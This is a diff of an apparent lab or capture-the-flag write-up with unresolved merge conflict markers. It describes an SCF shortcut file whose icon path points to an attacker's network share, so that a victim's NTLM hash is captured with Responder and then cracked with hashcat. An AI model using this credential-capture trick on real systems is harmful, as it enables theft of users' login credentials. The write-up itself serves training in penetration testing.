@@ -48,11 +48,16 @@ Command=ToggleDesktop
 ```notes
 This code sets up a shortcut with an icon and a task:
     1. [Shell] Section:
-        ○ Command=2: Specifies an action to be triggered when the shortcut is used.
-        ○ IconFile=\\10.10.14.4\tools\nc.ico: Sets the icon for the shortcut, located on a network server.
+        Command=2: Specifies an action to be triggered when the shortcut is used.
+        IconFile=\\10.10.14.4\tools\nc.ico: Sets the icon for the shortcut, located on a network server.
     2. [Taskbar] Section:
+<<<<<<< HEAD
         ○ Command=ToggleDesktop: Makes the desktop visible or hidden when the shortcut is clicked.
 ```
+=======
+        Command=ToggleDesktop: Makes the desktop visible or hidden when the shortcut is clicked.
+
+>>>>>>> dd150571635d7b5341aa73a8181dbae15fa83cdb
 
 Now we got Tony's hash from the responder instance, we will save it and try to crack it using hashcat
 
